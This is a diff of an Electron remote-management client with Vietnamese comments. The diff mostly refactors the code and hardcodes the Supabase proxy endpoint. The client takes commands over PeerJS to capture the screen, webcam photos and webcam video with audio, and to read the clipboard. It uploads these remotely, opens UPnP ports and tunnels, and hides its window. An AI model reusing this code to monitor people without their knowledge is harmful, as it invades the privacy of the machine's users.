@@ -80,15 +80,14 @@
     const path = require('path');
     const fs   = require('fs');
 
-    // ── Proxy config ─────────────────────────────────────────────────────────────
-    // Chỉ cần URL của Edge Function — không có anon key trong code
-    const PROXY_URL = (() => {
-      try { return localStorage.getItem('sm_proxy_url') || ''; } catch(e) { return ''; }
-    })();
+    // ── Proxy config ──────────────────────────────────────────────────────────────
+    // URL hardcode — đây là endpoint public, KHÔNG phải secret.
+    // Không cần thiết lập localStorage, không cần thao tác thủ công.
+    const PROXY_URL = 'https://iirezrszalmecsslbruo.supabase.co/functions/v1/sm-proxy';
 
-    // ── Device ID + Token ───────────────────────────────────────────────────
-    // device_id: ID nhận diện thiết bị (hiển thị cho user)
-    // device_token: token bí mật, chỉ nằm trong localStorage của máy này
+    // ── Device ID + Token ─────────────────────────────────────────────────────────
+    // device_id   : ID nhận diện thiết bị (hiển thị cho user, chia sẻ được)
+    // device_token: token bí mật 32-byte, tự sinh 1 lần, chỉ lưu trong localStorage
     let deviceId = localStorage.getItem('sm_device_id');
     if (!deviceId) {
       const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
@@ -100,7 +99,6 @@
 
     let deviceToken = localStorage.getItem('sm_device_token');
     if (!deviceToken) {
-      // Sinh token ngẫu nhiên 32 bytes hex — không có crypto.randomUUID? dùng fallback
       try {
         const arr = new Uint8Array(32);
         crypto.getRandomValues(arr);
@@ -111,10 +109,9 @@
       localStorage.setItem('sm_device_token', deviceToken);
     }
 
-    // ── Proxy helper ──────────────────────────────────────────────────────────
-    // Gọi sm-proxy Edge Function. Không bao giờ gọi Supabase trực tiếp từ client.
+    // ── Proxy helper ──────────────────────────────────────────────────────────────
+    // Toàn bộ giao tiếp Supabase đi qua đây. Không bao giờ gọi trực tiếp.
     async function proxy(action, params = {}) {
-      if (!PROXY_URL) return null;
       try {
         const res = await fetch(PROXY_URL, {
           method : 'POST',
@@ -127,8 +124,7 @@
           })
         });
         if (!res.ok) {
-          const txt = await res.text();
-          console.error(`[proxy] ${action} error ${res.status}:`, txt);
+          console.error(`[proxy] ${action} error ${res.status}:`, await res.text());
           return null;
         }
         return await res.json();
@@ -138,7 +134,7 @@
       }
     }
 
-    // ── Pairing overlay ───────────────────────────────────────────────────
+    // ── Pairing overlay ───────────────────────────────────────────────────────────
     const isPaired = localStorage.getItem('sm_paired') === '1';
     if (!isPaired) {
       document.getElementById('pairing-overlay').style.display = 'flex';
@@ -155,17 +151,14 @@
       ipcRenderer.invoke('hide-window');
     });
 
-    // ── Optional modules ─────────────────────────────────────────────────
-    let upnpManager      = null;
-    let go2rtcMgr        = null;
-    let autoNetwork      = null;
-    let tunnelMgr        = null;
-    try { upnpManager  = require('../src/upnp-manager');   } catch(e) { console.log('[client] upnp-manager not loaded:', e.message); }
-    try { go2rtcMgr    = require('../src/go2rtc-manager');  } catch(e) { console.log('[client] go2rtc-manager not loaded:', e.message); }
-    try { autoNetwork  = require('../src/auto-network');    } catch(e) { console.log('[client] auto-network not loaded:', e.message); }
-    try { tunnelMgr    = require('../src/tunnel-manager');  } catch(e) { console.log('[client] tunnel-manager not loaded:', e.message); }
+    // ── Optional modules ──────────────────────────────────────────────────────────
+    let upnpManager = null, go2rtcMgr = null, autoNetwork = null, tunnelMgr = null;
+    try { upnpManager = require('../src/upnp-manager');  } catch(e) { console.log('[client] upnp-manager not loaded:', e.message); }
+    try { go2rtcMgr   = require('../src/go2rtc-manager'); } catch(e) { console.log('[client] go2rtc-manager not loaded:', e.message); }
+    try { autoNetwork = require('../src/auto-network');   } catch(e) { console.log('[client] auto-network not loaded:', e.message); }
+    try { tunnelMgr   = require('../src/tunnel-manager'); } catch(e) { console.log('[client] tunnel-manager not loaded:', e.message); }
 
-    // ── System info ────────────────────────────────────────────────────────
+    // ── System info ───────────────────────────────────────────────────────────────
     function getSystemInfo() {
       return {
         hostname: os.hostname(), platform: os.platform(),
@@ -173,16 +166,11 @@
       };
     }
 
-    // ── Register & Heartbeat (qua proxy) ──────────────────────────────
-    async function registerDevice() {
-      const sys = getSystemInfo();
-      await proxy('register', sys);
-    }
-    async function heartbeat() {
-      await proxy('heartbeat');
-    }
+    // ── Register & Heartbeat ──────────────────────────────────────────────────────
+    async function registerDevice() { await proxy('register', getSystemInfo()); }
+    async function heartbeat()      { await proxy('heartbeat'); }
 
-    // ── Settings (mặc định tất đều false — chỉ bật khi Manager thiết lập) ──────
+    // ── Settings (mặc định false — chỉ bật khi Manager thiết lập) ────────────────
     let currentSettings = {
       screen_capture_on: false, screen_interval_min: 5,
       webcam_capture_on: false, webcam_interval_min: 5,
@@ -209,14 +197,12 @@
       proxy('update_field', { field: 'online', value: false });
     });
 
-    // ── Network utils ───────────────────────────────────────────────────
+    // ── Network utils ─────────────────────────────────────────────────────────────
     function getLocalIpAndSubnet() {
       const nets = os.networkInterfaces();
-      for (const name of Object.keys(nets)) {
-        for (const ifc of nets[name]) {
+      for (const name of Object.keys(nets))
+        for (const ifc of nets[name])
           if (ifc.family === 'IPv4' && !ifc.internal) return { ip: ifc.address, netmask: ifc.netmask };
-        }
-      }
       return null;
     }
 
@@ -286,7 +272,7 @@
       } catch(e) { return { success: false, error: e.message }; }
     }
 
-    // ── Upload capture qua proxy (base64) ──────────────────────────────
+    // ── Upload capture qua proxy (base64) ─────────────────────────────────────────
     async function uploadCapture(type, blob, contentType, filename, thumbnail = null) {
       try {
         const b64 = await new Promise(resolve => {
@@ -294,9 +280,7 @@
           reader.onload = () => resolve(reader.result.split(',')[1]);
           reader.readAsDataURL(blob);
         });
-        const res = await proxy('upload_capture', {
-          type, filename, content_type: contentType, data: b64, thumbnail
-        });
+        const res = await proxy('upload_capture', { type, filename, content_type: contentType, data: b64, thumbnail });
         return res?.url || null;
       } catch(e) { console.error('[upload]', e.message); return null; }
     }
@@ -305,7 +289,7 @@
       await proxy('record_capture', { type, storage_path: fileUrl, metadata, thumbnail });
     }
 
-    // ── Screenshot ─────────────────────────────────────────────────────────
+    // ── Screenshot ────────────────────────────────────────────────────────────────
     async function captureScreenshot() {
       try {
         const source = await ipcRenderer.invoke('get-desktop-source');
@@ -330,7 +314,7 @@
       } catch(e) { console.error('[screenshot]', e); return null; }
     }
 
-    // ── Webcam ────────────────────────────────────────────────────────────
+    // ── Webcam ────────────────────────────────────────────────────────────────────
     async function captureWebcamPhoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -358,8 +342,8 @@
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true })
           .catch(() => navigator.mediaDevices.getUserMedia({ video: true }));
-        mediaRecorder   = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
-        recordedChunks  = [];
+        mediaRecorder  = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
+        recordedChunks = [];
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
         mediaRecorder.onstop = async () => {
           const blob     = new Blob(recordedChunks, { type: 'video/webm' });
@@ -377,7 +361,7 @@
       if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
     }
 
-    // ── Clipboard ──────────────────────────────────────────────────────────
+    // ── Clipboard ─────────────────────────────────────────────────────────────────
     let lastClipboardText = '';
     function checkClipboard() {
       if (!currentSettings.clipboard_monitor_on) return;
@@ -388,7 +372,7 @@
       }
     }
 
-    // ── Timer manager ───────────────────────────────────────────────────
+    // ── Timer manager ─────────────────────────────────────────────────────────────
     let timers = {};
     function applySettings() {
       const start = (key, fn, ms) => { if (!timers[key]) timers[key] = setInterval(fn, ms); };
@@ -407,7 +391,7 @@
         : stop('clipboard');
     }
 
-    // ── PeerJS ──────────────────────────────────────────────────────────────
+    // ── PeerJS ────────────────────────────────────────────────────────────────────
     const peer = new Peer(deviceId, {
       config: { iceServers: [
         { urls: 'stun:stun.l.google.com:19302' },
@@ -447,9 +431,9 @@
     peer.on('connection', conn => {
       conn.on('data', async data => {
         switch (data.cmd) {
-          case 'snap-screen':  { const url = await captureScreenshot();  conn.send({ cmd:'snap-screen-result',  url }); break; }
-          case 'snap-webcam':  { const url = await captureWebcamPhoto(); conn.send({ cmd:'snap-webcam-result',  url }); break; }
-          case 'get-clipboard':{
+          case 'snap-screen':   { const url = await captureScreenshot();  conn.send({ cmd:'snap-screen-result',  url }); break; }
+          case 'snap-webcam':   { const url = await captureWebcamPhoto(); conn.send({ cmd:'snap-webcam-result',  url }); break; }
+          case 'get-clipboard': {
             const text = clipboard.readText();
             await recordCapture('clipboard', null, { text });
             conn.send({ cmd:'get-clipboard-result', text });
@@ -555,7 +539,7 @@
       });
     });
 
-    // ── Alarm ─────────────────────────────────────────────────────────────
+    // ── Alarm ─────────────────────────────────────────────────────────────────────
     let audioCtx;
     function playAlarm() {
       if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -571,7 +555,7 @@
       osc.start(); osc.stop(audioCtx.currentTime + 5);
     }
 
-    // ── Tunnel helpers ──────────────────────────────────────────────────
+    // ── Tunnel helpers ────────────────────────────────────────────────────────────
     function getTunnelConfig() {
       try {
         const cfgPath = path.join(os.homedir(), 'AppData', 'Roaming', 'ServiceManager-Client', 'config.json');
@@ -582,14 +566,11 @@
 
     async function initTunnel() {
       if (!tunnelMgr) return;
-      // Thay supabaseReq bằng proxy wrapper để tunnel-manager cũng dùng proxy
       const proxyForTunnel = async (endpoint, opts = {}) => {
-        // tunnel-manager cần gọi PATCH sm_devices — chuyển sang update_field
         const body = opts.body ? JSON.parse(opts.body) : {};
         const results = [];
-        for (const [field, value] of Object.entries(body)) {
+        for (const [field, value] of Object.entries(body))
           results.push(await proxy('update_field', { field, value }));
-        }
         return results[0] || true;
       };
       return tunnelMgr.init({
@@ -599,7 +580,7 @@
       });
     }
 
-    // ── IPC: network-changed → restart tunnel ───────────────────────────
+    // ── IPC: network-changed → restart tunnel ─────────────────────────────────────
     ipcRenderer.on('network-changed', (_, info) => {
       console.log(`[client] ⚡ Network changed (${info.reason}: ${info.ip}) → restarting tunnels...`);
       if (tunnelMgr) { tunnelMgr.stop(); setTimeout(() => initTunnel(), 2000); }
@@ -608,7 +589,7 @@
       console.log('[client] ❌ Network lost. Tunnels will auto-retry when reconnected.');
     });
 
-    // ── Startup ─────────────────────────────────────────────────────────────
+    // ── Startup ───────────────────────────────────────────────────────────────────
     async function start() {
       // 1. UPnP
       if (upnpManager) {
@@ -620,12 +601,12 @@
         }).catch(e => console.log('[upnp] start error:', e.message));
       }
 
-      // 2. Register + heartbeat
+      // 2. Register + heartbeat (mỗi 45 giây)
       await registerDevice();
       await fetchSettings();
       setInterval(async () => { await heartbeat(); await fetchSettings(); }, 45000);
 
-      // 3. Auto-network (scan camera, go2rtc)
+      // 3. Auto-network
       if (autoNetwork) {
         let savedCreds = null;
         try { savedCreds = JSON.parse(localStorage.getItem('sm_auto_camera_creds')); } catch(e) {}
@@ -633,12 +614,10 @@
           upnpMgr    : upnpManager,
           go2rtcMgr  : go2rtcMgr,
           supabaseReq: (ep, opts) => {
-            // Chuyển sang proxy để auto-network cũng không dùng anon key
             const body = opts?.body ? JSON.parse(opts.body) : {};
-            const promises = Object.entries(body).map(([field, value]) =>
+            return Promise.all(Object.entries(body).map(([field, value]) =>
               proxy('update_field', { field, value })
-            );
-            return Promise.all(promises);
+            ));
           },
           devId      : deviceId,
           credentials: savedCreds
